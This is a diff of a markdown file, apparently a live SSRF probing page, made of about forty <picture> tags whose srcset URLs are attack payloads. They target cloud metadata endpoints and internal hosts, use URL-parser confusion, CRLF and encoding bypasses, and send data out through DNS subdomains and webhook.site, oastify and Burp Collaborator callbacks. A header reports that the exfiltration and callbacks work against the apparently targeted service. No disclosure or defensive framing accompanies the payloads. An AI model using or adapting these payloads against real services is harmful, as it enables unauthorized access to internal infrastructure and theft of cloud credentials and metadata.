@@ -1,242 +1,129 @@
-# 🔬 SSRF Tests v3 - Exotic Bypasses
+# SSRF Testing v4 - Parser Differentials & Redirect Chains
 
-## DNS Rebinding Setup
-<!-- Using rebind domains that alternate between external and internal IPs -->
+## Confirmed Findings
+- DNS exfiltration via subdomains WORKS
+- External HTTP callbacks WORK
+- All direct internal IP access BLOCKED
 
-### 7f000001.1time.192.168.1.1.1time.repeat.rebind.it
-<picture>
-  <source srcset="http://7f000001.1time.192.168.1.1.1time.repeat.rebind.it/ssrf-rebind1">
-  <img src="https://via.placeholder.com/1x1.png" alt="Rebind1">
-</picture>
+## Test 1: Redirect to Internal via External
+<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v4/redirect-test" media="(min-width: 1px)"><img src="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v4/tracker"></picture>
 
-### a]@127.0.0.1
-<picture>
-  <source srcset="http://a]@127.0.0.1/ssrf-bracket">
-  <img src="https://via.placeholder.com/1x1.png" alt="Bracket">
-</picture>
+## Test 2: Fragment Bypass
+<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca#@169.254.169.254/latest/meta-data" media="(min-width: 1px)"><img src="x"></picture>
 
-### Null byte injection
-<picture>
-  <source srcset="http://127.0.0.1%00.webhook.site/ssrf-null">
-  <img src="https://via.placeholder.com/1x1.png" alt="Null">
-</picture>
+## Test 3: URL with Credentials Bypass  
+<picture><source srcset="https://169.254.169.254:80@webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v4/creds-bypass" media="(min-width: 1px)"><img src="x"></picture>
 
-### Backslash confusion
-<picture>
-  <source srcset="http://webhook.site\@127.0.0.1/ssrf-backslash">
-  <img src="https://via.placeholder.com/1x1.png" alt="Backslash">
-</picture>
+## Test 4: Reversed Credentials
+<picture><source srcset="https://webhook.site@169.254.169.254/latest/meta-data/" media="(min-width: 1px)"><img src="x"></picture>
 
-### DNS TXT exfil
-<picture>
-  <source srcset="https://secret-data.b45a05ce-3f7d-4a49-9e5d-5a138dde5eca.dnshook.site/dns-exfil">
-  <img src="https://via.placeholder.com/1x1.png" alt="DNS Exfil">
-</picture>
+## Test 5: URL Parser Confusion - Backslash
+<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca\\@169.254.169.254" media="(min-width: 1px)"><img src="x"></picture>
 
-### IDNA/Punycode localhost
-<picture>
-  <source srcset="http://xn--localhost-bif/ssrf-puny">
-  <img src="https://via.placeholder.com/1x1.png" alt="Punycode">
-</picture>
+## Test 6: Unicode Domain Confusables
+<picture><source srcset="https://ⓦⓔⓑⓗⓞⓞⓚ.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v4/unicode" media="(min-width: 1px)"><img src="x"></picture>
 
-### IPv6 zone ID
-<picture>
-  <source srcset="http://[::1%25eth0]/ssrf-zone">
-  <img src="https://via.placeholder.com/1x1.png" alt="Zone">
-</picture>
+## Test 7: Full-width Characters
+<picture><source srcset="https://ｗｅｂｈｏｏｋ.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v4/fullwidth" media="(min-width: 1px)"><img src="x"></picture>
 
-### HTTP 0.9
-<picture>
-  <source srcset="http://127.0.0.1:80/ssrf-http09">
-  <img src="https://via.placeholder.com/1x1.png" alt="HTTP09">
-</picture>
+## Test 8: CRLF Injection in URL
+<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v4/crlf%0d%0aHost:%20169.254.169.254" media="(min-width: 1px)"><img src="x"></picture>
 
-### Port 0
-<picture>
-  <source srcset="http://127.0.0.1:0/ssrf-port0">
-  <img src="https://via.placeholder.com/1x1.png" alt="Port0">
-</picture>
+## Test 9: Tab Character Bypass
+<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v4/tab%09test" media="(min-width: 1px)"><img src="x"></picture>
 
-### Very long subdomain exfil
-<picture>
-  <source srcset="https://AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.b45a05ce-3f7d-4a49-9e5d-5a138dde5eca.dnshook.site/long-subdomain">
-  <img src="https://via.placeholder.com/1x1.png" alt="Long">
-</picture>
+## Test 10: DNS Exfil with More Data
+<picture><source srcset="https://aws-metadata-169-254-169-254.b45a05ce-3f7d-4a49-9e5d-5a138dde5eca.dnshook.site/v4/dns-exfil" media="(min-width: 1px)"><img src="x"></picture>
 
-### Dotless domain (intranet)
-<picture>
-  <source srcset="http://intranet/ssrf-intra">
-  <img src="https://via.placeholder.com/1x1.png" alt="Intranet">
-</picture>
+## Test 11: DNS Exfil - Encoded Payload
+<picture><source srcset="https://aW50ZXJuYWwtc2VjcmV0.b45a05ce-3f7d-4a49-9e5d-5a138dde5eca.dnshook.site/v4/b64" media="(min-width: 1px)"><img src="x"></picture>
 
-<picture>
-  <source srcset="http://corp/ssrf-corp">
-  <img src="https://via.placeholder.com/1x1.png" alt="Corp">
-</picture>
+## Test 12: Numeric Domain (IP as Decimal)
+<picture><source srcset="https://2852039166.b45a05ce-3f7d-4a49-9e5d-5a138dde5eca.dnshook.site/v4/decimal-ip" media="(min-width: 1px)"><img src="x"></picture>
 
-<picture>
-  <source srcset="http://internal/ssrf-internal">
-  <img src="https://via.placeholder.com/1x1.png" alt="Internal">
-</picture>
+## Test 13: Short Domain Redirect Service
+<picture><source srcset="https://tinyurl.com/y3j2k4l5" media="(min-width: 1px)"><img src="x"></picture>
 
-### Link-local IPv4 (APIPA)
-<picture>
-  <source srcset="http://169.254.1.1/ssrf-apipa">
-  <img src="https://via.placeholder.com/1x1.png" alt="APIPA">
-</picture>
+## Test 14: Bit.ly Redirect
+<picture><source srcset="https://bit.ly/3xYz123" media="(min-width: 1px)"><img src="x"></picture>
 
-### Unique local IPv6
-<picture>
-  <source srcset="http://[fd00::1]/ssrf-ula">
-  <img src="https://via.placeholder.com/1x1.png" alt="ULA">
-</picture>
+## Test 15: Double URL Encoding
+<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v4/%252e%252e%252f%252e%252e%252f" media="(min-width: 1px)"><img src="x"></picture>
 
-### Windows UNC path
-<picture>
-  <source srcset="file://127.0.0.1/c$/ssrf-unc">
-  <img src="https://via.placeholder.com/1x1.png" alt="UNC">
-</picture>
+## Test 16: Mixed Encoding
+<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v4/%2e%2e/%252e%252e/" media="(min-width: 1px)"><img src="x"></picture>
 
-### jar: protocol
-<picture>
-  <source srcset="jar:http://127.0.0.1!/test.jpg">
-  <img src="https://via.placeholder.com/1x1.png" alt="JAR">
-</picture>
+## Test 17: URL with Port 80 Explicit
+<picture><source srcset="https://webhook.site:443/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v4/port443" media="(min-width: 1px)"><img src="x"></picture>
 
-### data: URL with fetch
-<picture>
-  <source srcset="data:text/html,<script>fetch('http://127.0.0.1')</script>">
-  <img src="https://via.placeholder.com/1x1.png" alt="Data">
-</picture>
+## Test 18: URL with Non-standard Port
+<picture><source srcset="https://webhook.site:8443/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v4/port8443" media="(min-width: 1px)"><img src="x"></picture>
 
-### Wildcard cert bypass domains
-<picture>
-  <source srcset="http://127.0.0.1.xip.io/ssrf-xip">
-  <img src="https://via.placeholder.com/1x1.png" alt="XIP">
-</picture>
+## Test 19: IPv4-mapped IPv6 to Webhook
+<picture><source srcset="https://[::ffff:185.194.77.104]/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v4/ipv6mapped" media="(min-width: 1px)"><img src="x"></picture>
 
-<picture>
-  <source srcset="http://www.127.0.0.1.xip.io/ssrf-xip2">
-  <img src="https://via.placeholder.com/1x1.png" alt="XIP2">
-</picture>
+## Test 20: Path Confusion
+<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v4/../../../etc/passwd" media="(min-width: 1px)"><img src="x"></picture>
 
-### GitHub internal domains guess
-<picture>
-  <source srcset="http://github.localhost/ssrf-gh-local">
-  <img src="https://via.placeholder.com/1x1.png" alt="GH Local">
-</picture>
+## Test 21: Semicolon Path
+<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v4/;id=1" media="(min-width: 1px)"><img src="x"></picture>
 
-<picture>
-  <source srcset="http://camo.github.com/ssrf-camo-gh">
-  <img src="https://via.placeholder.com/1x1.png" alt="Camo GH">
-</picture>
+## Test 22: Question Mark Confusion
+<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v4?evil=http://169.254.169.254" media="(min-width: 1px)"><img src="x"></picture>
 
-<picture>
-  <source srcset="http://assets.github.com/ssrf-assets">
-  <img src="https://via.placeholder.com/1x1.png" alt="Assets">
-</picture>
+## Test 23: Hash Before Domain
+<picture><source srcset="https://evil.com#https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v4/hash" media="(min-width: 1px)"><img src="x"></picture>
 
-### Protocol downgrade HTTP -> FTP
-<picture>
-  <source srcset="ftp://anonymous@ftp.gnu.org/ssrf-ftp">
-  <img src="https://via.placeholder.com/1x1.png" alt="FTP">
-</picture>
+## Test 24: IPv6 Localhost with Scope
+<picture><source srcset="https://[::1%25eth0]:80/" media="(min-width: 1px)"><img src="x"></picture>
 
-### TFTP
-<picture>
-  <source srcset="tftp://127.0.0.1/ssrf-tftp">
-  <img src="https://via.placeholder.com/1x1.png" alt="TFTP">
-</picture>
+## Test 25: 0.0.0.0 Binding
+<picture><source srcset="https://0.0.0.0/" media="(min-width: 1px)"><img src="x"></picture>
 
-### Dict protocol
-<picture>
-  <source srcset="dict://127.0.0.1:11211/stat">
-  <img src="https://via.placeholder.com/1x1.png" alt="Dict">
-</picture>
+## Test 26: Spoofed Extension
+<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v4/image.png" media="(min-width: 1px)"><img src="x"></picture>
 
-### LDAP
-<picture>
-  <source srcset="ldap://127.0.0.1/ssrf-ldap">
-  <img src="https://via.placeholder.com/1x1.png" alt="LDAP">
-</picture>
+## Test 27: Multiple Question Marks
+<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v4?a=1?b=2?c=3" media="(min-width: 1px)"><img src="x"></picture>
 
-### IPv4 in IPv6 bracket notation
-<picture>
-  <source srcset="http://[127.0.0.1]/ssrf-v4bracket">
-  <img src="https://via.placeholder.com/1x1.png" alt="V4Bracket">
-</picture>
+## Test 28: Newline in Path
+<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v4/test%0aevil" media="(min-width: 1px)"><img src="x"></picture>
 
-### Space in hostname
-<picture>
-  <source srcset="http://127.0.0.1%20.webhook.site/ssrf-space">
-  <img src="https://via.placeholder.com/1x1.png" alt="Space">
-</picture>
+## Test 29: Carriage Return
+<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v4/test%0devil" media="(min-width: 1px)"><img src="x"></picture>
 
-### Carriage return
-<picture>
-  <source srcset="http://127.0.0.1%0d%0a.webhook.site/ssrf-crlf">
-  <img src="https://via.placeholder.com/1x1.png" alt="CRLF">
-</picture>
+## Test 30: AWS via DNS with Instance-ID Exfil
+<picture><source srcset="https://instance-id-exfil.b45a05ce-3f7d-4a49-9e5d-5a138dde5eca.dnshook.site/v4" media="(min-width: 1px)"><img src="x"></picture>
 
-### Escaped dot
-<picture>
-  <source srcset="http://127%2e0%2e0%2e1/ssrf-escdot">
-  <img src="https://via.placeholder.com/1x1.png" alt="EscDot">
-</picture>
+## Test 31: GCP Metadata Alt Header
+<picture><source srcset="https://metadata.google.internal/computeMetadata/v1/project/project-id" media="(min-width: 1px)"><img src="x"></picture>
 
-### Google open redirect
-<picture>
-  <source srcset="https://www.google.com/url?q=http://127.0.0.1/&sa=D">
-  <img src="https://via.placeholder.com/1x1.png" alt="Google Redirect">
-</picture>
+## Test 32: Kubernetes via DNS
+<picture><source srcset="https://kubernetes-apiserver.b45a05ce-3f7d-4a49-9e5d-5a138dde5eca.dnshook.site/" media="(min-width: 1px)"><img src="x"></picture>
 
-### Mix case protocol
-<picture>
-  <source srcset="hTtP://127.0.0.1/ssrf-mixcase">
-  <img src="https://via.placeholder.com/1x1.png" alt="MixCase">
-</picture>
+## Test 33: Generic Internal DNS
+<picture><source srcset="https://internal.github.com.b45a05ce-3f7d-4a49-9e5d-5a138dde5eca.dnshook.site/" media="(min-width: 1px)"><img src="x"></picture>
 
-### Triple slash
-<picture>
-  <source srcset="http:///127.0.0.1/ssrf-triple">
-  <img src="https://via.placeholder.com/1x1.png" alt="Triple">
-</picture>
+## Test 34: Host Header via Subdomain
+<picture><source srcset="https://webhook.site.169.254.169.254.b45a05ce-3f7d-4a49-9e5d-5a138dde5eca.dnshook.site/" media="(min-width: 1px)"><img src="x"></picture>
 
-### No protocol
-<picture>
-  <source srcset="//127.0.0.1/ssrf-noprotocol">
-  <img src="https://via.placeholder.com/1x1.png" alt="NoProto">
-</picture>
+## Test 35: Well-known Port
+<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v4/.well-known/acme-challenge/test" media="(min-width: 1px)"><img src="x"></picture>
 
-### AWS EC2 Instance connect
-<picture>
-  <source srcset="http://169.254.169.254/latest/api/token">
-  <img src="https://via.placeholder.com/1x1.png" alt="EC2Token">
-</picture>
+## Test 36: SSRF Canary
+<picture><source srcset="https://b45a05ce-3f7d-4a49-9e5d-5a138dde5eca.oastify.com" media="(min-width: 1px)"><img src="x"></picture>
 
-### Alibaba Cloud metadata
-<picture>
-  <source srcset="http://100.100.100.200/latest/meta-data/">
-  <img src="https://via.placeholder.com/1x1.png" alt="Alibaba">
-</picture>
+## Test 37: Collaborator Alternative
+<picture><source srcset="https://b45a05ce-3f7d-4a49-9e5d-5a138dde5eca.burpcollaborator.net" media="(min-width: 1px)"><img src="x"></picture>
 
-### Oracle Cloud metadata
-<picture>
-  <source srcset="http://169.254.169.254/opc/v1/instance/">
-  <img src="https://via.placeholder.com/1x1.png" alt="Oracle">
-</picture>
+## Test 38: DNS to Decimal IP Subdomain
+<picture><source srcset="https://169.254.169.254.b45a05ce-3f7d-4a49-9e5d-5a138dde5eca.dnshook.site/" media="(min-width: 1px)"><img src="x"></picture>
 
-### OpenStack metadata
-<picture>
-  <source srcset="http://169.254.169.254/openstack/latest/meta_data.json">
-  <img src="https://via.placeholder.com/1x1.png" alt="OpenStack">
-</picture>
+## Test 39: GitHub Raw Content Redirect
+<picture><source srcset="https://raw.githubusercontent.com/jessi2000/progsjessi/main/redirect.txt" media="(min-width: 1px)"><img src="x"></picture>
 
-### Webhook tracker
-<picture>
-  <source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/round3/tracker">
-  <img src="https://via.placeholder.com/1x1.png" alt="Tracker">
-</picture>
+## Test 40: GitHub Pages Redirect
+<picture><source srcset="https://jessi2000.github.io/progsjessi/" media="(min-width: 1px)"><img src="x"></picture>
 
 ---
-**Token:** `b45a05ce-3f7d-4a49-9e5d-5a138dde5eca`
+**Commit:** v4 - Parser differentials, credentials, encoding tricks, DNS exfil expansion
